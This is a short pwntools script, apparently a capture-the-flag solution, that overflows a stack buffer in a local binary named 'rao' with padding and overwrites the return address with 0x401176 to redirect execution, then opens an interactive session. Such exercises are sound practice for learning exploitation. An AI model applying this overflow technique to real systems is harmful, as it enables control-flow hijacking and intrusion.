from pwn import *

p = process('./rao')


addr = 0x401176
payload = b"A"*0x30
payload += b"B"*0x8
payload += p64(addr)
p.sendline(payload)

p.interactive()
